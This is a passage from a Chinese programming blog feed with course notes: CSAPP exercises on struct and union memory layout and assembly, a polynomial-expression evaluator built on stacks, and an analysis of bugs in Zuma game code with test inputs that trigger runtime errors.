class="language-assembly">function2:    movl i(%rip), %eax    leal (%rax,%rax,2), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>请分析针对这段代码, 编译器做了什么优化工作.</p><p><strong>解答:</strong></p><p>将 <code>int input_struct</code> 声明为 <code>static</code> 后只会被当前编译单元被调用, 优化 <code>function2</code> 后无需调用 <code>input_struct</code>, 因此可以不进行编译.</p></li><li><p>有如下三类结构、联合定义, 请根据左侧的汇编语言 $(x86-32)$, 补齐右侧的 $C$ 语言.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">union</span> u1 b<span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>d<span class="token punctuation">;</span>    <span class="token keyword">char</span> e<span class="token punctuation">;</span>    <span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">union</span> u1 <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>h<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> j<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">A.proc1:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl 12(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">proc1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">B.proc2:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl 4(%eax), %eaxmovl 20(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">proc2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">C.proc3:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl (%eax), %eaxmovsbl 4(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token function">proc3</span><span class="token punctuation">(</span><span class="token keyword">union</span> u1 <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">D.proc4:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl (%eax), %eaxmovl 24(%eax), %eaxmovl (%eax), %eaxmovsbl 1(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token function">proc4</span><span class="token punctuation">(</span><span class="token keyword">union</span> u1 <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">A<span class="token operator">:</span> f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> B<span class="token operator">:</span> b<span class="token punctuation">.</span>i<span class="token operator">-&gt;</span>f<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>C<span class="token operator">:</span> i<span class="token operator">-&gt;</span>eD<span class="token operator">:</span> i<span class="token operator">-&gt;</span>g<span class="token operator">-&gt;</span>d<span class="token operator">-&gt;</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>已知以下 $C++$ 代码与对应的运行结果, 对源代码进行补全并绘制 <code>struct A​</code> 各变量在内存中的存放位置.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdint&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>T1 a<span class="token punctuation">;</span>T2 b<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>T3 c<span class="token punctuation">;</span>T4 d<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>B e<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    A s<span class="token punctuation">;</span>    size_t size_A <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"size of A:"</span> <span class="token operator">&lt;&lt;</span> size_A <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>s<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size_A<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>a <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>b <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"e[0].c: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"e[0].d: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>d <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">size of A<span class="token operator">:</span> <span class="token number">96</span>a<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">21846</span>b<span class="token operator">:</span> <span class="token number">12297829382473034410</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1431655766</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">3.72066e-103</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请补全以下类型和常数:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">T1<span class="token operator">:</span> <span class="token keyword">short</span>T2<span class="token operator">:</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span>T3<span class="token operator">:</span> <span class="token keyword">int</span>T4<span class="token operator">:</span> <span class="token keyword">double</span>N<span class="token operator">:</span> <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>struct A​</code> 的内存布局 (需绘制出 <code>struct B</code> 中各变量):</p></li></ol><div align="center"><img src="/pic/11.png" width="100%" height="100%"></div>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polynomial</title>
      <link href="/2022/10/22/polynomial/"/>
      <url>/2022/10/22/polynomial/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA2"><a href="#CST-PA2" class="headerlink" title="CST PA2"></a>CST PA2</h1><h2 id="2-2-Polynomial"><a href="#2-2-Polynomial" class="headerlink" title="2-2 Polynomial"></a>2-2 Polynomial</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>将待计算字符串中的常数对象和变量 <code>x</code> 均视为多项式——常数视为零次多项式, <code>x</code> 视为一次多项式, 那么本题相当于一个中缀多项式表达式求值的过程.</p><p>因此基本思路与中缀表达式求值相同. 编写一个栈类 <code>class Stack</code> 存储运算数和运算符, 同时编写一个多项式类 <code>class Poly</code> 并重载 <code>+</code>、<code>-</code>、<code>*</code>、<code>^</code> 运算符进行计算.</p><p>我们遍历读入的表达式, 同时设置一个多项式栈和运算符栈:</p><ul><li>如果读入数字, 则持续遍历直到不再读到数字, 并将这些数字合并为一个完整的数后转换为零次多项式加入多项式栈.</li></ul><p>接下来需要判断表达式中是否省略了 <code>'*'</code> 运算符.</p><ul><li>如果当前字符为 <code>'('</code> 或 <code>'x'</code>, 此时读取当前字符的上一个字符并进行判断, 如果上一个字符为数字或 <code>'x'</code> 或 <code>')'</code>, 则说明此处省略了乘号. 此时将上一个字符改为乘号并返回处理即可 (因为上一个字符已处理完毕, 对其进行更改不会影响已有结果.)</li></ul><p>接下来处理读取 <code>'x'</code> 情况和读取运算符情况即可.</p><ul><li>如果读入 <code>'x'</code>, 将其转换为一次多项式并加入多项式栈.</li><li>如果读入运算符, 则需比较当前运算符和运算符栈顶符号间的优先级:<ul><li>如果栈顶运算符优先级更低, 则推迟计算, 将当前运算符入栈;</li><li>如果两运算符优先级相等, 那么当前运算符为 <code>')'</code> 或者尾哨兵 <code>'\0'</code>, 直接退栈并接收下一个字符即可;</li><li>如果栈顶运算符优先级更高, 则取出多项式栈顶的两个元素执行运算并将结果压入多项式栈中.</li></ul></li><li>最后多项式栈仅剩一个多项式对象, 即中缀表达式的最终运算结果. 将其记录的系数信息逐项输出即可.</li></ul><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>基于数组实现了栈的数据结构:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">class</span> <span class="token class-name">Stack</span> <span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    T<span class="token operator">*</span> _a<span class="token punctuation">;</span>    <span class="token keyword">int</span> _size<span class="token punctuation">;</span>    <span class="token keyword">int</span> _capacity<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">Stack</span><span class="token punctuation">(</span><span class="token keyword">int</span> capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    T<span class="token operator">&amp;</span> <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    T <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每次基本操作时间复杂度均为 $O(1)$.</p><p>实现多项式类:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Poly</span> <span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> coe<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> deg<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">Poly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Poly</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly <span class="token keyword">operator</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化常数多项式, 使用构造函数 <code>Poly(long long a)</code>; 初始化一次多项式, 使用构造函数 <code>Poly()</code>.</p><p>在每次二元运算操作后, 将运算结果更新至第一个操作对象中, 同时更新其记录的最高次数.</p><h3 id="问题发现与优化"><a href="#问题发现与优化" class="headerlink" title="问题发现与优化"></a>问题发现与优化</h3><p>开始的提交中测例 <code>15</code> 会出现 <code>Time Limit Exceeded</code> 的问题. 通过对代码具体实现进行了若干优化解决了该问题.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 102</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Poly <span class="token keyword">operator</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 实现 * 运算符.</span>    <span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 优先考虑被乘数为常数情况.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>deg <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token comment">// 再考虑乘数为常数情况.</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>deg <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>推测是因为多项式乘法的时间常数过大, 导致实际运算超时. 在多项式乘法中添加了判断两个多项式次数是否为 <code>0</code> 的过程, 使得计算常多项式乘积耗时降低, 解决了测例 <code>15</code> 的 <code>Time Limit Exceeded</code> 问题.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自遍历输入表达式与多项式计算两部分:</p><p>在遍历输入表达式时, 每个元素最多入栈和出栈一次, 每次操作均为常数时间, 从而时间复杂度与输入表达式长度成正比, 为 $O(n)$;</p><p>在进行多项式计算时, 多项式栈中每两个对象经一次计算后返回一个对象. 若输入表达式能够贡献 <code>k</code> 个表达式, 则需进行 <code>k - 1</code> 次计算得出最终结果. 注意到幂运算所需时间最长, 因此最差情况为 <code>64</code> 次多项式进行幂运算, 所需为常数时间. 从而时间复杂度为 $O(n)$;</p><p>综上, 算法总时间复杂度为 $O(n)$, 具有小的时间常数.</p><p>算法空间复杂度主要来自读取字符串、转换为多项式并存储数据的过程:</p><p>由于输入串的长度上界为 <code>1,000,000</code>, 那么其实际可贡献同时入栈的多项式数和运算符数最坏情况也不会超过 <code>Max = 900,000</code>. 使用 <code>Max</code> 作为容量初始化栈:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Stack<span class="token operator">&lt;</span>Poly<span class="token operator">&gt;</span> opnd <span class="token operator">=</span> <span class="token generic-function"><span class="token function">Stack</span><span class="token generic class-name"><span class="token operator">&lt;</span>Poly<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>Max<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 多项式栈.</span>Stack<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span> optr <span class="token operator">=</span> <span class="token generic-function"><span class="token function">Stack</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>Max<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 运算符栈.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主要内存被分配给多项式栈与运算符栈, 程序占用的极限内存约为: $4B\times 66\times 9 \times 10^5 + 1B \times 9 \times 10^5 = 238500KB = 233.9MB &lt; 256MB$.</p><p>恰好满足题意.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zuma</title>
      <link href="/2022/10/19/zuma/"/>
      <url>/2022/10/19/zuma/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB1"><a href="#CST-LAB1" class="headerlink" title="CST LAB1"></a>CST LAB1</h1><h2 id="Zuma"><a href="#Zuma" class="headerlink" title="Zuma"></a>Zuma</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码 1"></a>代码 1</h3><ul><li><p>错误类型: <code>Runtime Error</code>  </p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> rank<span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> rank<span class="token punctuation">;</span>    <span class="token keyword">char</span> color <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">--</span>left<span class="token punctuation">;</span>    left <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> right <span class="token operator">-</span> left<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>play</code> 函数并未显式调用 <code>return</code>, 在这里 <code>left</code> 的范围为 <code>[0, rank]</code>.</p><p>因此, 若 <code>left</code> 在函数体内变为 <code>0</code>, 那么在尾部调用 <code>play(left - 1)</code> 时便会访问到越界的内存 <code>a.at(-1)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>AAB</code> 经第一次消除后变为 <code>B</code>, 因为消除发生在串的最前部, 此时 <code>play</code> 函数内 <code>left = 0</code>, 接下来调用 <code>play(left - 1)</code> 时便会访问到越界的内存 <code>a.at(-1)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">AAB<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码 2"></a>代码 2</h3><ul><li><p>错误类型: <code>Runtime Error</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> next <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> next <span class="token operator">=</span> left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处 <code>play</code> 函数处理了 <code>left = 0</code> 的情况. 但如果经过消除, 在函数尾部串 <code>a</code> 为空, 此时 <code>left = 0</code>, 发生调用 <code>play(0)</code> 便会越界访问了空串 <code>a</code> 的元素 <code>a.at(0)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>AA</code> 经第一次消除后变为空串, 因为消除发生在串的最前部, 此时 <code>play</code> 函数内 <code>next = left = 0</code>, 接下来调用 <code>play(next)</code> 时便会访问到越界的内存 <code>a.at(0)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">AA<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码 3"></a>代码 3</h3><ul><li><p>错误类型: <code>Time Limit Exceeded</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 